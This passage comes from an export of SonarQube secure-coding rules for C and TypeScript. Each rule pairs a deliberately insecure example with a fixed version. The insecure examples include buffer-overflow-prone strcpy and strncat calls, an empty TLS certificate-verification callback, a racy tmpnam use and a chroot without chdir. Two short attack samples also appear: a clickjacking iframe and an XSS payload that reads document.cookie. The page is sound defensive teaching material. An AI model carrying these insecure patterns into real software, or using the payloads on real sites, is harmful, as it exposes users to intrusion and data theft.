<p>The function <code>char *strncat( char *restrict dest, const char *restrict src, size_t count );</code> appends the characters of string
<code>src</code> at the end of <code>dest</code>, but only add <code>count</code> characters max. <code>dest</code> will always be
<code>null</code>-terminated. The <code>wcsncat</code> does the same for wide characters, and should be used with the same guidelines.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> There is a possibility that either the <code>src</code> or the <code>dest</code> pointer is <code>null</code> </li>
  <li> The current string length of <code>dest</code> plus the current string length of <code>src</code> plus 1 (for the final <code>null</code>
  character) is larger than the size of the buffer pointer-to by <code>src</code> </li>
  <li> There is a possibility that either string is not correctly <code>null</code>-terminated </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> C11 provides, in its annex K, the <code>strncat_s</code> and the <code>wcsncat_s</code> that were designed as safer alternatives to
  <code>strncat</code> and <code>wcsncat</code>. It’s not recommended to use them in all circumstances because they introduce a runtime overhead and
  require to write more code for error handling, but they perform checks that will limit the consequences of calling the function with bad arguments.
  </li>
  <li> Even if your compiler does not exactly support annex K, you probably have access to similar functions </li>
  <li> If you are using <code>strncat</code> and <code>wsncat</code> as a safer version of <code>strcat</code> and <code>wcscat</code>, you should
  instead consider <code>strcat_s</code> and <code>wcscat_s</code> because these functions have several shortcomings:
    <ul>
      <li> It’s not easy to detect truncation </li>
      <li> The <code>count</code> parameter is error-prone </li>
      <li> Computing the <code>count</code> parameter typically requires computing the string length of <code>dest</code>, at which point other
      simpler alternatives exist </li>
    </ul>  </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
int f(char *src) {
  char dest[256];
  strcpy(dest, "Result: ");
  strncat(dest, src, sizeof dest); // Sensitive: passing the buffer size instead of the remaining size
  return doSomethingWith(dest);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
int f(char *src) {
  char result[] = "Result: ";
  char dest[256];
  strcpy(dest, result);
  strncat(dest, src, sizeof dest - sizeof result); // Compliant but may silently truncate
  return doSomethingWith(dest);
}
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/">Top 10 2021 Category A6 - Vulnerable and Outdated
  Components</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities">Top 10 2017 Category A9 -
  Using Components with Known Vulnerabilities</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/120">CWE-120 - Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')</a>
  </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/HdcxBQ">CERT, STR07-C.</a> - Use the bounds-checking interfaces for string manipulation </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=c:S5824">
              c:S5824
            </a>
          </td>
          <td>
            <details>
              <p>The functions "tmpnam", "tmpnam_s" and "tmpnam_r" are all used to return a file name that does not match an existing file, in order for the
application to create a temporary file. However, even if the file did not exist at the time those functions were called, it might exist by the time
the application tries to use the file name to create the files. This has been used by hackers to gain access to files that the application believed
were trustworthy.</p>
<p>There are alternative functions that, in addition to creating a suitable file name, create and open the file and return the file handler. Such
functions are protected from this attack vector and should be preferred. About the only reason to use these functions would be to create a temporary
folder, not a temporary file.</p>
<p>Additionally, these functions might not be thread-safe, and if you don’t provide them buffers of sufficient size, you will have a buffer
overflow.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> There is a possibility that several threads call any of these functions simultaneously </li>
  <li> There is a possibility that the resulting file is opened without forcing its creation, meaning that it might have unexpected access rights
  </li>
  <li> The buffers passed to these functions are respectively smaller than
    <ul>
      <li> <code>L_tmpnam</code> for <code>tmpnam</code> </li>
      <li> <code>L_tmpnam_s</code> for <code>tmpnam_s</code> </li>
      <li> <code>L_tmpnam</code> for <code>tmpnam_r</code> </li>
    </ul>  </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Use a function that directly opens the temporary file, such a <code>tmpfile</code>, <code>tmpfile_s</code>, <code>mkstemp</code> or
  <code>mkstemps</code> (the last two allow more accurate control of the file name). </li>
  <li> If you can’t get rid of these functions, when using the generated name to open the file, use a function that forces the creation of the file
  and fails if the file already exists. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
int f(char *tempData) {
  char *path = tmpnam(NULL); // Sensitive
  FILE* f = fopen(tmpnam, "w");
  fputs(tempData, f);
  fclose(f);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
int f(char *tempData) {
  // The file will be opened in "wb+" mode, and will be automatically removed on normal program exit
  FILE* f = tmpfile(); // Compliant
  fputs(tempData, f);
  fclose(f);
}
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/">Top 10 2021 Category A6 - Vulnerable and Outdated
  Components</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities">Top 10 2017 Category A9 -
  Using Components with Known Vulnerabilities</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/377">CWE-377 - Insecure Temporary File</a> </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/display/c/CON33-C.+Avoid+race+conditions+when+using+library+functions">CERT, CON33-C.</a> - Avoid
  race conditions when using library functions </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/display/c/FIO21-C.+Do+not+create+temporary+files+in+shared+directories">CERT, FIO21-C.</a> - Do
  not create temporary files in shared directories </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=c:S1313">
              c:S1313
            </a>
          </td>
          <td>
            <details>
              <p>Hardcoding IP addresses is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-5901">CVE-2006-5901</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3725">CVE-2005-3725</a> </li>
</ul>
<p>Today’s services have an ever-changing architecture due to their scaling and redundancy needs. It is a mistake to think that a service will always
have the same IP address. When it does change, the hardcoded IP will have to be modified too. This will have an impact on the product development,
delivery, and deployment:</p>
<ul>
  <li> The developers will have to do a rapid fix every time this happens, instead of having an operation team change a configuration file. </li>
  <li> It misleads to use the same address in every environment (dev, sys, qa, prod). </li>
</ul>
<p>Last but not least it has an effect on application security. Attackers might be able to decompile the code and thereby discover a potentially
sensitive address. They can perform a Denial of Service attack on the service, try to get access to the system, or try to spoof the IP address to
bypass security checks. Such attacks can always be possible, but in the case of a hardcoded IP address solving the issue will take more time, which
will increase an attack’s impact.</p>
<h2>Ask Yourself Whether</h2>
<p>The disclosed IP address is sensitive, e.g.:</p>
<ul>
  <li> Can give information to an attacker about the network topology. </li>
  <li> It’s a personal (assigned to an identifiable person) IP address. </li>
</ul>
<p>There is a risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Don’t hard-code the IP address in the source code, instead make it configurable with environment variables, configuration files, or a similar
approach. Alternatively, if confidentially is not required a domain name can be used since it allows to change the destination quickly without having
to rebuild the software.</p>
<h2>Sensitive Code Example</h2>
<pre>
dbi_conn conn = dbi_conn_new("mysql");
string host = "10.10.0.1"; // Sensitive
dbi_conn_set_option(conn, "host", host.c_str());
dbi_conn_set_option(conn, "host", "10.10.0.1"); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
dbi_conn conn = dbi_conn_new("mysql");
string host = getDatabaseHost(); // Compliant
dbi_conn_set_option(conn, "host", host.c_str()); // Compliant
</pre>
<h2>Exceptions</h2>
<p>No issue is reported for the following cases because they are not considered sensitive:</p>
<ul>
  <li> Loopback addresses 127.0.0.0/8 in CIDR notation (from 127.0.0.0 to 127.255.255.255) </li>
  <li> Broadcast address 255.255.255.255 </li>
  <li> Non-routable address 0.0.0.0 </li>
  <li> Strings of the form <code>2.5.&lt;number&gt;.&lt;number&gt;</code> as they <a href="http://www.oid-info.com/introduction.htm">often match
  Object Identifiers</a> (OID) </li>
  <li> Addresses in the ranges 192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24, reserved for documentation purposes by <a
  href="https://datatracker.ietf.org/doc/html/rfc5737">RFC 5737</a> </li>
  <li> Addresses in the range 2001:db8::/32, reserved for documentation purposes by <a href="https://datatracker.ietf.org/doc/html/rfc3849">RFC
  3849</a> </li>
</ul>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=c:S4830">
              c:S4830
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability makes it possible that an encrypted communication is intercepted.</p>
<h2>Why is this an issue?</h2>
<p>Transport Layer Security (TLS) provides secure communication between systems over the internet by encrypting the data sent between them.
Certificate validation adds an extra layer of trust and security to this process to ensure that a system is indeed the one it claims to be.</p>
<p>When certificate validation is disabled, the client skips a critical security check. This creates an opportunity for attackers to pose as a trusted
entity and intercept, manipulate, or steal the data being transmitted.</p>
<h3>What is the potential impact?</h3>
<p>Establishing trust in a secure way is a non-trivial task. When you disable certificate validation, you are removing a key mechanism designed to
build this trust in internet communication, opening your system up to a number of potential threats.</p>
<h4>Identity spoofing</h4>
<p>If a system does not validate certificates, it cannot confirm the identity of the other party involved in the communication. An attacker can
exploit this by creating a fake server and masquerading as a legitimate one. For example, they might set up a server that looks like your bank’s
server, tricking your system into thinking it is communicating with the bank. This scenario, called identity spoofing, allows the attacker to collect
any data your system sends to them, potentially leading to significant data breaches.</p>
<h4>Loss of data integrity</h4>
<p>When TLS certificate validation is disabled, the integrity of the data you send and receive cannot be guaranteed. An attacker could modify the data
in transit, and you would have no way of knowing. This could range from subtle manipulations of the data you receive to the injection of malicious
code or malware into your system. The consequences of such breaches of data integrity can be severe, depending on the nature of the data and the
system.</p>
<h2>How to fix it in Botan</h2>
<h3>Code examples</h3>
<p>The following code contains examples of disabled certificate validation.</p>
<p>The certificate validation gets disabled by overriding <code>tls_verify_cert_chain</code> with an empty implementation. It is highly recommended to
use the original implementation.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
#include &lt;botan/tls_client.h&gt;
#include &lt;botan/tls_callbacks.h&gt;
#include &lt;botan/tls_session_manager.h&gt;
#include &lt;botan/tls_policy.h&gt;
#include &lt;botan/auto_rng.h&gt;
#include &lt;botan/certstor.h&gt;
#include &lt;botan/certstor_system.h&gt;

class Callbacks : public Botan::TLS::Callbacks
{
    virtual void tls_verify_cert_chain(
              const std::vector&lt;Botan::X509_Certificate&gt; &amp;cert_chain,
              const std::vector&lt;std::shared_ptr&lt;const Botan::OCSP::Response&gt;&gt; &amp;ocsp_responses,
              const std::vector&lt;Botan::Certificate_Store *&gt; &amp;trusted_roots,
              Botan::Usage_Type usage,
              const std::string &amp;hostname,
              const Botan::TLS::Policy &amp;policy)
    override  { }
};

class Client_Credentials : public Botan::Credentials_Manager { };

void connect() {
    Callbacks callbacks;
    Botan::AutoSeeded_RNG rng;
    Botan::TLS::Session_Manager_In_Memory session_mgr(rng);
    Client_Credentials creds;
    Botan::TLS::Strict_Policy policy;

    Botan::TLS::Client client(callbacks, session_mgr, creds, policy, rng,
                              Botan::TLS::Server_Information("example.com", 443),
                              Botan::TLS::Protocol_Version::TLS_V12); // Noncompliant
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
#include &lt;botan/tls_client.h&gt;
#include &lt;botan/tls_callbacks.h&gt;
#include &lt;botan/tls_session_manager.h&gt;
#include &lt;botan/tls_policy.h&gt;
#include &lt;botan/auto_rng.h&gt;
#include &lt;botan/certstor.h&gt;
#include &lt;botan/certstor_system.h&gt;

class Callbacks : public Botan::TLS::Callbacks { };

class Client_Credentials : public Botan::Credentials_Manager { };

void connect() {
    Callbacks callbacks;
    Botan::AutoSeeded_RNG rng;
    Botan::TLS::Session_Manager_In_Memory session_mgr(rng);
    Client_Credentials creds;
    Botan::TLS::Strict_Policy policy;

    Botan::TLS::Client client(callbacks, session_mgr, creds, policy, rng,
                              Botan::TLS::Server_Information("example.com", 443),
                              Botan::TLS::Protocol_Version::TLS_V12);
}
</pre>
<h3>How does this work?</h3>
<p>Addressing the vulnerability of disabled TLS certificate validation primarily involves re-enabling the default validation.</p>
<p>To avoid running into problems with invalid certificates, consider the following sections.</p>
<h4>Using trusted certificates</h4>
<p>If possible, always use a certificate issued by a well-known, trusted CA for your server. Most programming environments come with a predefined list
of trusted root CAs, and certificates issued by these authorities are validated automatically. This is the best practice, and it requires no
additional code or configuration.</p>
<h4>Working with self-signed certificates or non-standard CAs</h4>
<p>In some cases, you might need to work with a server using a self-signed certificate, or a certificate issued by a CA not included in your trusted
roots. Rather than disabling certificate validation in your code, you can add the necessary certificates to your trust store.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> <a href="https://botan.randombit.net/handbook/">Botan</a> - Handbook </li>
  <li> <a href="https://www.feistyduck.com/books/openssl-cookbook/">OpenSSL</a> - Cookbook </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication">Mobile Top 10 2016 Category M3 - Insecure
  Communication</a> </li>
  <li> OWASP - <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements">Mobile AppSec
  Verification Standard - Network Communication Requirements</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/295">CWE-295 - Improper Certificate Validation</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=c:S5801">
              c:S5801
            </a>
          </td>
          <td>
            <details>
              <p>In C, a string is just a buffer of characters, normally using the <code>null</code> character as a sentinel for the end of the string. This means
that the developer has to be aware of low-level details such as buffer sizes or having an extra character to store the final <code>null</code>
character. Doing that correctly and consistently is notoriously difficult and any error can lead to a security vulnerability, for instance, giving
access to sensitive data or allowing arbitrary code execution.</p>
<p>The function <code>char *strcpy(char * restrict dest, const char * restrict src);</code> copies characters from <code>src</code> to
<code>dest</code>. The <code>wcscpy</code> does the same for wide characters and should be used with the same guidelines.</p>
<p>Note: the functions <code>strncpy</code> and <code>wcsncpy</code> might look like attractive safe replacements for <code>strcpy</code> and
<code>wcscpy</code>, but they have their own set of issues (see <a href='/organizations/sopra-steria/rules?open=c%3AS5816&rule_key=c%3AS5816'>S5816</a>), and you should probably prefer another more adapted
alternative.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> There is a possibility that either the source or the destination pointer is <code>null</code> </li>
  <li> There is a possibility that the source string is not correctly <code>null</code>-terminated, or that its length (including the final
  <code>null</code> character) can be larger than the size of the destination buffer. </li>
  <li> There is an overlap between source and destination </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> C11 provides, in its annex K, the <code>strcpy_s</code> and the <code>wcscpy_s</code> that were designed as safer alternatives to
  <code>strcpy</code> and <code>wcscpy</code>. It’s not recommended to use them in all circumstances, because they introduce a runtime overhead and
  require to write more code for error handling, but they perform checks that will limit the consequences of calling the function with bad arguments.
  </li>
  <li> Even if your compiler does not exactly support annex K, you probably have access to similar functions, for example, <code>strlcpy</code> in
  FreeBSD </li>
  <li> If you are writing C++ code, using <code>std::string</code> to manipulate strings is much simpler and less error-prone </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
int f(char *src) {
  char dest[256];
  strcpy(dest, src); // Sensitive: might overflow
  return doSomethingWith(dest);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
int f(char *src) {
  char *dest = malloc(strlen(src) + 1); // For the final 0
  strcpy(dest, src); // Compliant: we made sure the buffer is large enough
  int r= doSomethingWith(dest);
  free(dest);
  return r;
}
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/">Top 10 2021 Category A6 - Vulnerable and Outdated
  Components</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities">Top 10 2017 Category A9 -
  Using Components with Known Vulnerabilities</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/120">CWE-120 - Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')</a>
  </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/HdcxBQ">CERT, STR07-C.</a> - Use the bounds-checking interfaces for string manipulation </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=c:S5802">
              c:S5802
            </a>
          </td>
          <td>
            <details>
              <p>The purpose of creating a jail, the "virtual root directory" created with chroot-type functions, is to limit access to the file system by isolating
the process inside this jail. However, many chroot function implementations don’t modify the current working directory, thus the process has still
access to unauthorized resources outside of the "jail".</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The application changes the working directory before or after running chroot. </li>
  <li> The application uses a path inside the jail directory as working directory. </li>
</ul>
<p>There is a risk if you answered no to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Change the current working directory to the root directory after switching to a jail directory.</p>
<h2>Sensitive Code Example</h2>
<p>The current directory is not changed with the <code>chdir</code> function before or after the creation of a jail with the <code>chroot</code>
function:</p>
<pre>
const char* root_dir = "/jail/";
chroot(root_dir); // Sensitive: no chdir before or after chroot, and missing check of return value
</pre>
<p>The <code>chroot</code> or <code>chdir</code> operations could fail and the process still have access to unauthorized resources. The return code
should be checked:</p>
<pre>
const char* root_dir = "/jail/";
chroot(root_dir); // Sensitive: missing check of the return value
const char* any_dir = "/any/";
chdir(any_dir); // Sensitive: missing check of the return value
</pre>
<h2>Compliant Solution</h2>
<p>To correctly isolate the application into a jail, change the current directory with <code>chdir</code> before the <code>chroot</code> and check the
return code of both functions:</p>
<pre>
const char* root_dir = "/jail/";

if (chdir(root_dir) == -1) {
  exit(-1);
}

if (chroot(root_dir) == -1) {  // compliant: the current dir is changed to the jail and the results of both functions are checked
  exit(-1);
}
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">Top 10 2017 Category A5 - Broken Access Control</a>
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/243">CWE-243 - Creation of chroot Jail Without Changing Working Directory</a> </li>
  <li> <a href="https://man7.org/linux/man-pages/man2/chdir.2.html">man7.org</a> - chdir </li>
  <li> <a href="https://man7.org/linux/man-pages/man2/chroot.2.html">man7.org</a> - chroot </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S5732">
              typescript:S5732
            </a>
          </td>
          <td>
            <details>
              <p><a href="https://en.wikipedia.org/wiki/Clickjacking">Clickjacking</a> attacks occur when an attacker try to trick an user to click on certain
buttons/links of a legit website. This attack can take place with malicious HTML frames well hidden in an attacker website.</p>
<p>For instance, suppose a safe and authentic page of a social network (https://socialnetworkexample.com/makemyprofilpublic) which allows an user to
change the visibility of his profile by clicking on a button. This is a critical feature with high privacy concerns. Users are generally well informed
on the social network of the consequences of this action. An attacker can trick users, without their consent, to do this action with the below
embedded code added on a malicious website:</p>
<pre>
&lt;html&gt;
&lt;b&gt;Click on the button below to win 5000$&lt;/b&gt;
&lt;br&gt;
&lt;iframe src="https://socialnetworkexample.com/makemyprofilpublic" width="200" height="200"&gt;&lt;/iframe&gt;
&lt;/html&gt;
</pre>
<p>Playing with the size of the iframe it’s sometimes possible to display only the critical parts of a page, in this case the button of the
<em>makemyprofilpublic</em> page.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> <a href="https://en.wikipedia.org/wiki/Clickjacking#Clickjacking_categories">Critical actions</a> of the application are prone to clickjacking
  attacks because a simple click on a link or a button can trigger them. </li>
</ul>
<p>There is a risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Implement content security policy <em>frame-ancestors</em> directive which is supported by all modern browsers and will specify the origins of
frame allowed to be loaded by the browser (this directive deprecates <a
href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options">X-Frame-Options</a>).</p>
<h2>Sensitive Code Example</h2>
<p>In Express.js application the code is sensitive if the <a href="https://www.npmjs.com/package/helmet-csp">helmet-csp</a> or <a
href="https://www.npmjs.com/package/helmet">helmet</a> middleware is used without the <code>frameAncestors</code> directive (or if
<code>frameAncestors</code> is set to <code>'none'</code>):</p>
<pre>
const express = require('express');
const helmet = require('helmet');

let app = express();

app.use(
  helmet.contentSecurityPolicy({
    directives: {
      // other directives
      frameAncestors: ["'none'"] // Sensitive: frameAncestors  is set to none
    }
  })
);
</pre>
<h2>Compliant Solution</h2>
<p>In Express.js application a standard way to implement CSP frame-ancestors directive is the <a
href="https://www.npmjs.com/package/helmet-csp">helmet-csp</a> or <a href="https://www.npmjs.com/package/helmet">helmet</a> middleware:</p>
<pre>
const express = require('express');
const helmet = require('helmet');

let app = express();

app.use(
  helmet.contentSecurityPolicy({
    directives: {
      // other directives
      frameAncestors: ["'example.com'"] // Compliant
    }
  })
);
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/">Top 10 2021 Category A4 - Insecure Design</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html">OWASP Cheat Sheets</a> - Clickjacking Defense
  Cheat Sheet </li>
  <li> <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors">developer.mozilla.org</a> -
  Frame-ancestors </li>
  <li> <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">developer.mozilla.org</a> - Content Security Policy (CSP) </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/451">CWE-451 - User Interface (UI) Misrepresentation of Critical Information</a> </li>
  <li> <a href="https://www.w3.org/TR/CSP3/">w3.org</a> - Content Security Policy Level 3 </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S5734">
              typescript:S5734
            </a>
          </td>
          <td>
            <details>
              <p><a href="https://blog.mozilla.org/security/2016/08/26/mitigating-mime-confusion-attacks-in-firefox/">MIME confusion</a> attacks occur when an
attacker successfully tricks a web-browser to interpret a resource as a different type than the one expected. To correctly interpret a resource
(script, image, stylesheet …​) web browsers look for the <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Type">Content-Type
header</a> defined in the HTTP response received from the server, but often this header is not set or is set with an incorrect value. To avoid
content-type mismatch and to provide the best user experience, web browsers try to deduce the right content-type, generally by inspecting the content
of the resources (the first bytes). This "guess mechanism" is called <a href="https://en.wikipedia.org/wiki/Content_sniffing">MIME type
sniffing</a>.</p>
<p>Attackers can take advantage of this feature when a website ("example.com" here) allows to upload arbitrary files. In that case, an attacker can
upload a malicious image <em>fakeimage.png</em> (containing malicious JavaScript code or <a
href="https://docs.microsoft.com/fr-fr/archive/blogs/ieinternals/script-polyglots">a polyglot content</a> file) such as:</p>
<pre>
&lt;script&gt;alert(document.cookie)&lt;/script&gt;
</pre>
<p>When the victim will visit the website showing the uploaded image, the malicious script embedded into the image will be executed by web browsers
performing MIME type sniffing.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Type">Content-Type</a> header is not systematically set for all
  resources. </li>
  <li> Content of resources can be controlled by users. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Implement <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options">X-Content-Type-Options</a> header with
<em>nosniff</em> value (the only existing value for this header) which is supported by all modern browsers and will prevent browsers from performing
MIME type sniffing, so that in case of Content-Type header mismatch, the resource is not interpreted. For example within a &lt;script&gt; object
context, JavaScript MIME types are expected (like <em>application/javascript</em>) in the Content-Type header.</p>
<h2>Sensitive Code Example</h2>
<p>In Express.js application the code is sensitive if, when using <a href="https://www.npmjs.com/package/helmet">helmet</a>, the <code>noSniff</code>
middleware is disabled:</p>
<pre>
const express = require('express');
const helmet = require('helmet');

let app = express();

app.use(
  helmet({
    noSniff: false, // Sensitive
  })
);
</pre>
<h2>Compliant Solution</h2>
<p>When using <code>helmet</code> in an Express.js application, the <code>noSniff</code> middleware should be enabled (it is also done by
default):</p>
<pre>
const express = require('express');
const helmet= require('helmet');

let app = express();

app.use(helmet.noSniff());
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options">developer.mozilla.org</a> - X-Content-Type-Options
  </li>
  <li> <a href="https://blog.mozilla.org/security/2016/08/26/mitigating-mime-confusion-attacks-in-firefox/">blog.mozilla.org</a> - Mitigating MIME
  Confusion Attacks in Firefox </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S5852">
              typescript:S5852
            </a>
          </td>
          <td>
            <details>
              <p>Most of the regular expression engines use backtracking to try all possible execution paths of the regular expression when evaluating an input, in
some cases it can cause performance issues, called <strong>catastrophic backtracking</strong> situations. In the worst case, the complexity of the
regular expression is exponential in the size of the input, this means that a small carefully-crafted input (like 20 chars) can trigger catastrophic
backtracking and cause a denial of service of the application. Super-linear regex complexity can lead to the same impact too with, in this case, a
large carefully-crafted input (thousands chars).</p>
<p>This rule determines the runtime complexity of a regular expression and informs you if it is not linear.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The input is user-controlled. </li>
  <li> The input size is not restricted to a small number of characters. </li>
  <li> There is no timeout in place to limit the regex evaluation time. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>To avoid catastrophic backtracking situations, make sure that none of the following conditions apply to your regular expression.</p>
<p>In all of the following cases, catastrophic backtracking can only happen if the problematic part of the regex is followed by a pattern that can
fail, causing the backtracking to actually happen.</p>
<ul>
  <li> If you have a repetition <code>r*</code> or <code>r*?</code>, such that the regex <code>r</code> could produce different possible matches (of
  possibly different lengths) on the same input, the worst case matching time can be exponential. This can be the case if <code>r</code> contains
  optional parts, alternations or additional repetitions (but not if the repetition is written in such a way that there’s only one way to match it).
  </li>
  <li> If you have multiple repetitions that can match the same contents and are consecutive or are only separated by an optional separator or a
  separator that can be matched by both of the repetitions, the worst case matching time can be polynomial (O(n^c) where c is the number of
  problematic repetitions). For example <code>a*b*</code> is not a problem because <code>a*</code> and <code>b*</code> match different things and
  <code>a*_a*</code> is not a problem because the repetitions are separated by a <code>'_'</code> and can’t match that <code>'_'</code>. However,
  <code>a*a*</code> and <code>.*_.*</code> have quadratic runtime. </li>
  <li> If the regex is not anchored to the beginning of the string, quadratic runtime is especially hard to avoid because whenever a match fails, the
  regex engine will try again starting at the next index. This means that any unbounded repetition, if it’s followed by a pattern that can fail, can
  cause quadratic runtime on some inputs. For example <code>str.split(/\s*,/)</code> will run in quadratic time on strings that consist entirely of
  spaces (or at least contain large sequences of spaces, not followed by a comma). </li>
</ul>
<p>In order to rewrite your regular expression without these patterns, consider the following strategies:</p>
